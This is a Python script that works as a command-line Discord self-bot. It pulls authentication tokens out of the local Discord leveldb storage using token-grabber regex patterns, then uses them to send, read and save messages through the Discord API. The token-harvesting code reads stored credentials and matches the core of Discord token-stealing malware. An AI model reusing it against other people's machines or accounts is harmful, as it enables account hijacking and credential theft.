import os
import json
import re 
from re import findall
from subprocess import Popen
from urllib.request import Request, urlopen
from time import sleep

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

path = ROAMING + "\\Discord"
tokens = []
path += "\\Local Storage\\leveldb"
for file_name in os.listdir(path):
    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
        continue
    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
            for token in findall(regex, line):
                tokens.append(token)
                
def pretty_json(json_thing, sort=True, indents=4):
    if type(json_thing) is str:
        return json.dumps(json.loads(json_thing), sort_keys=sort, indent=indents)
    else:
        return json.dumps(json_thing, sort_keys=sort, indent=indents)                

def get_headers(token, content_type="application_json"):
    headers = {
        "Content-Type" : content_type,
        "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
        "Authorization" : token
    }
    return headers

def text_to_data(text):
    data=f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\n{text}\n-----------------------------325414537030329320151394843687--'
    return data

def my_data():
    return "https://discordapp.com/api/v6/users/@me"

def user_data():
    return "https://discordapp.com/api/v6/users/"

def my_channels():
    return "https://discordapp.com/api/v6/users/@me/channels"

def my_friends():
    return "https://discordapp.com/api/v6/users/@me/relationships"

def my_servers():
    return "https://discordapp.com/api/v6/users/@me/guilds"

def server(server_id):
    return f"https://discordapp.com/api/v6/guilds/{server_id}"

def server_channels(server_id):
    return f"https://discordapp.com/api/v6/guilds/{server_id}/channels"

def channel_messages(chat_id):
    return f"https://discordapp.com/api/v6/channels/{chat_id}/messages"

def send_messages(chat_id, text):
    try:
        urlopen(Request(channel_messages(chat_id), headers=get_headers(tokens[0], "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=text_to_data(text).encode())).read().decode()
    except:
        pass
        
def get_username(user_id):
    user = json.loads(urlopen(Request(user_data() + user_id, headers=get_headers(tokens[0]))).read().decode())
    return user["username"]

def get_chatid_by_username(username):
    channels = json.loads(urlopen(Request(my_channels(), headers=get_headers(tokens[0]))).read().decode())
    friends = json.loads(urlopen(Request(my_friends(), headers=get_headers(tokens[0]))).read().decode())
    for i in range(len(channels)):
        try:
            if channels[i]["icons"]:
                pass
        except KeyError:
            if channels[i]["recipients"][0]["username"] == username:
                return channels[i]["id"]
            sleep(1)
          
def get_serverid_by_name(servername):
    servers = json.loads(urlopen(Request(my_servers(), headers=get_headers(tokens[0]))).read().decode())
    for i in range(len(servers)):
        if servers[i]["name"] == servername:
            return servers[i]["id"]
        sleep(1)
    
def get_textchannel_by_name(serverid, channelname):
    channels = json.loads(urlopen(Request(server_channels(serverid), headers=get_headers(tokens[0]))).read().decode())
    for i in range(len(channels)):
        if channels[i]["name"] == channelname:
            return channels[i]["id"]
        sleep(1)
        
def get_textchanneltype_by_name(serverid, channelname):
    channels = json.loads(urlopen(Request(server_channels(serverid), headers=get_headers(tokens[0]))).read().decode())
    for i in range(len(channels)):
        if channels[i]["name"] == channelname:
            return channels[i]["type"]
        sleep(1)
    
def dump_to_json(url, filename):
    json_object = json.dumps(json.loads(urlopen(Request(url, headers=get_headers(tokens[0]))).read().decode()), sort_keys=True, indent=4) 
    with open(filename, "w") as outfile:
        outfile.write(json_object)
        
def check_mention(message):
    is_mentioning = re.search("<@![\d]{18}>", message)
    is_mentioning_alternate = re.search("<@[\d]{18}>", message)
    if is_mentioning:
        list_of_mentions = re.findall("<@![\d]{18}>", message)
        new_message = message
        for i in list_of_mentions:
            new_message = re.sub(i, "@" + get_username(re.findall("[\d]{18}", i)[0]), new_message)
    elif is_mentioning_alternate:
        list_of_mentions = re.findall("<@[\d]{18}>", message)
        new_message = message
        for i in list_of_mentions:
            new_message = re.sub(i, "@" + get_username(re.findall("[\d]{18}", i)[0]), new_message)
    else:
        return message
    return new_message
        

def read_channel(channel_id):
    messages = json.loads(urlopen(Request(channel_messages(channel_id), headers=get_headers(tokens[0]))).read().decode())
    dump_to_json(channel_messages(channel_id), "res.json")
    message_list = []
    for i in range(len(messages)):
        if "referenced_message" not in messages[i]:
            if messages[i]["embeds"] != []:
                if "provider" not in messages[i]["embeds"][0]:
                    sender = messages[i]["author"]["username"]
                    message = messages[i]["embeds"][0]["title"] + " | " + messages[i]["embeds"][0]["description"]
                    message_list.append(sender + ": " + check_mention(message))
                    continue
                else:
                    sender = messages[i]["author"]["username"]
                    message = messages[i]["content"]
                    message_list.append(sender + ": " + check_mention(message))
                    continue
            sender = messages[i]["author"]["username"]
            message = messages[i]["content"]
            if message == "":
                if messages[i]["type"] == 0:
                    message = messages[i]["attachments"][0]["url"]
                    message_list.append(sender + ": " + check_mention(message))
                else:
                    continue
            else:
                if messages[i]["attachments"] != []:
                    if messages[i]["type"] == 0:
                        attachment = messages[i]["attachments"][0]["url"]
                        message_list.append(sender + ": " + check_mention(message) + " " + attachment)
                    else:
                        continue
                else:
                    message_list.append(sender + ": " + check_mention(message))
        else:
            sender = messages[i]["author"]["username"]
            message = messages[i]["content"]
            if messages[i]["attachments"] != []:
                if messages[i]["type"] == 0:
                        attachment = messages[i]["attachments"][0]["url"]
                        message_list.append("   L> " + sender + ": " + check_mention(message) + " " + attachment)
                else:
                    continue
            else:
                message_list.append("   L> " + sender + ": " + check_mention(message))
            try:
                if messages[i]["referenced_message"]["id"] != messages[i+1]["id"]:
                    sender = messages[i]["referenced_message"]["author"]["username"]
                    message = messages[i]["referenced_message"]["content"]
                    if messages[i]["attachments"] != []:
                        if messages[i]["type"] == 0:
                            attachment = messages[i]["attachments"][0]["url"]
                            message_list.append(sender + ": " + check_mention(message) + " " + attachment)
                        else:
                            continue
                    else:
                        message_list.append(sender + ": " + check_mention(message))
                else:
                    continue
            except:
                continue
    return message_list

while True:          
    choice = input("Enter command: ")
    if choice == "send person":
        username = input("Enter username to send message (you must already chatted with the person!): ")
        text = input("Enter message to send: ")
        try:
            send_messages(get_chatid_by_username(username), text)
            print("Message sent to "+username+"!")
            dump_to_json(channel_messages(get_chatid_by_username(username)), "channel_message.json")
            print("DM history saved!")
        except:
            print("Error has occured! Check your username.")
    elif choice == "send server":
        server_name = input("Enter server name (case sensitive): ")
        channel_name = input("Enter channel name (case sensitive): ")
        if get_textchanneltype_by_name(get_serverid_by_name(server_name), channel_name) != 0:
            print("Channel is not a text channel.")
        else: 
            text = input("Enter message to send: ")
            try:   
                send_messages(get_textchannel_by_name(get_serverid_by_name(server_name), channel_name), text)
                print("Message sent to "+channel_name+" on "+server_name+"!")
                dump_to_json(channel_messages(get_textchannel_by_name(get_serverid_by_name(server_name), channel_name)), "channel_message.json")
                print("Channel history saved!")
            except:
                print("Error has occured! Check your server and channel name.")
    elif choice == "read server":
        server_name = input("Enter server name (case sensitive): ")
        channel_name = input("Enter channel name (case sensitive): ")
        if get_textchanneltype_by_name(get_serverid_by_name(server_name), channel_name) != 0:
            print("Channel is not a text channel.")
        else: 
            message_list = read_channel(get_textchannel_by_name(get_serverid_by_name(server_name),channel_name))[::-1]
            print("\n".join(message_list))
            with open(server_name + " " + channel_name + ".txt", "w") as outfile:
                outfile.write("\n".join(message_list))
    elif choice == "q":
        exit()